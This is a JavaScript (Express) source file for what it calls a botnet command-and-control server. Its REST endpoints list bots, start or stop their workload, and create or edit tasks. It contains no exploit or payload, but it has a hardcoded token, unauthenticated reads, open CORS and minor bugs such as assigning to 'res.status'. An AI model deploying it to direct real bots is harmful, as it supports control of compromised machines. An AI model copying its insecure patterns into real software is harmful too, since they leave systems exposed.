/**
 * botnet control server, provides REST API.
 * /api/Status[/id]
 * 		HTTP GET: for bot information
 * /api/Status/
 * 		HTTP POST: change bot workload by status
 * /api/Tasks[/id]
 * 		HTTP GET: task list or task information of given task id
 * /api/Tasks/
 * 		HTTP POST: modify task (id given) or create new task (id not given)
 */

var express = require('express');
var app = express();

/*
* body-parser - This is a node.js middleware for handling
* JSON, Raw, Text and URL encoded form data.
*/
var bodyParser = require('body-parser');

/*
* cors (cross-origin ressource sharing)is a mechanism to allows
* the restricted resources from another domain in web browser
*/
var cors = require('cors');

// require File System (fs) modul
var fs = require("fs");
var token = '031b46cd62bda614fffd542e20346821';

// Files to save objects
var STATUS_FILE = "status.json";
var TASKS_FILE = "tasks.json";

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({extended: true}));


// status array, caching status.json file. copy-on-write.
var status;

// tasks array, caching tasks.json file. copy-on-write.
var tasks;


/**
 * Do a json formatted response.
 * @param res response, given by express.js
 * @param json json-formatted text
 */
var jsonResponse = function(res, json) {
	// set Response header field Content-Type
	res.set('Content-Type', 'application/json; charset=utf-8');
	
	// sends Json response
	res.json(json);
};


/**
 * check Request-Header for valid Token and Content-Type
 * @param req
 * @returns {boolean}
 */
var isRequestHeaderValid = (req) => {
    return req.get('Token') == token && req.get('Content-Type') == 'application/json';
};


/**
 * Rsesponds with status 200 and Message OK
 * @param res
 */
var respondOk = (res) => {
    res.status = 200;
    jsonResponse(res, {"message": "OK"});
};


/**
 * Respond with status 400 and message NOT_OK
 * @param res
 */
var respondNotOk = (res) => {
    res.status = 400;
    jsonResponse(res, {"message": "NOT OK"});
};


/**
 * Update workload of all status entries (start/stop)
 * @param reqId The Id of item which should update
 * @returns {boolean} Returns true on success.
 */
var updateStatus = (reqBody)=> {
	var isFound = false;

	status.forEach((item) => {
		// id matches the given
        if (item.id == reqBody.id) {
            isFound = true;
            item.workload = reqBody.status === true ? 1 : 0;
        }
    });

    if (isFound) {
		// status is modified, save to disk
        fs.writeFile('status.json', JSON.stringify(status));
        return true;
    } else {
        return false;
    }
};


/**
 * Returns the next available taks id
 * @returns {number}
 */
var getNextFreeId = () => {
    var maxId = 0;
    tasks.forEach((item)=> {
        if (item.id > maxId) {
            maxId = item.id;
        }
    });
    
    console.log ('max id is '+ maxId);
    return maxId + 1;
};

/**
 * Update a found taks if Id is given. Case Id not given
 * It calculates the next available Id and creates a new
 * task entry with submitted data.
 * @param req request with the data inside body
 * @returns {boolean}
 */
var updateTask = (req) => {
    if (req.body.id === undefined) {
		// id isn't given, create new task
		console.log("task: id is not given, creating a new task");

        var nextId = getNextFreeId();

        tasks.push(
			{
				id: nextId,
				type: req.body.type,
				data: {
					input: req.body.data.input,
					output: null
				}
			}
        );
        
        fs.writeFile('tasks.json', JSON.stringify(tasks));
        
        return true;    
    } 
    else {
		// req.body.id is given, modify task
		var isModified = false;
		tasks.forEach( (task) => {
			if(task.id == req.body.id) {
				console.log("task found" + task);
				task.type = req.body.type;
				task.data.input = req.body.data.input;
				//task.data.output = req.body.data.output;

				fs.writeFile('tasks.json', JSON.stringify(tasks));
				console.log("before return");
				isModified = true;
			}
		});
		
		return isModified;
    } 
};


/**
 * http get to /api/Tasks/ handler, get the tasks.
 */
app.get('/api/Tasks', (req, res) => {
    console.log("tasks GET: /api/Tasks");

    jsonResponse(res, tasks);
});


/**
 * http get to /api/Tasks/:id handler, get the task given by id.
 */
app.get('/api/Tasks/:id', (req, res) => {
	
	//find tasks id from Tasks
	var item = tasks.find((task) => task.id == req.params.id);
	
	if(item === undefined) {
		console.log("tasks: id not present");
		respondNotOk(res);
	}
	else {
		console.log("tasks: id present");
		jsonResponse(res, item);
	}
});


/**
 * http post to /api/Tasks/ handler, creates or updates a task by id
 */
app.post('/api/Tasks', (req, res) => {
	if(isRequestHeaderValid(req) && updateTask(req)) {
		respondOk(res);
	}
	else {
		respondNotOk(res);
	}
});


/**
 * http get to /api/Status handler, get all bots.
 */
app.get('/api/Status', (req, res) => {
	console.log("status GET: /api/Status/");
    jsonResponse(res, status);
});


/**
 * http get to /api/Status/:id handler, gets a bot by given id.
 */
app.get('/api/Status/:id', (req, res) => {
	var item = status.find(function(val, index) {
		return val.id == req.params.id;
	});

	if(item === undefined) {
		console.log("status: id not present");
		respondNotOk(res);
	}
	else {
		console.log("status: id present");
		jsonResponse(res, item);
	}
});


/**
 * http post to /api/Status handler, updates a bot configuration.
 */
app.post('/api/Status', (req, res) => {
	if(isRequestHeaderValid(req) && updateStatus(req.body)) {
		respondOk(res);
	}
	else {
		respondNotOk(res);
	}
});


/** 
 * middleware fallback for error handling
 */
app.use( (err, req, res, next) => {
	console.log(err);
	
	respondNotOk(res);
});


/**
 * Read status.json, bot status is saved in global status variable
 */
var readStatus = function() {
	console.log("status: reading status.json");

	fs.readFile(STATUS_FILE, function (err, data)
	{
		if (err) throw err;
		status = JSON.parse(data);
	});
}

/**
 * Read tasks.json, tasks information is saved in global tasks variable
 */
var readTasks = function() {
	console.log("tasks: reading tasks.json");
	fs.readFile(TASKS_FILE, function (err, data)
	{
		if (err) throw err;
		tasks = JSON.parse(data);
	});
}


var server = app.listen(3000, function() {
	readStatus();
	readTasks();

	console.log("cnc server listening");
});
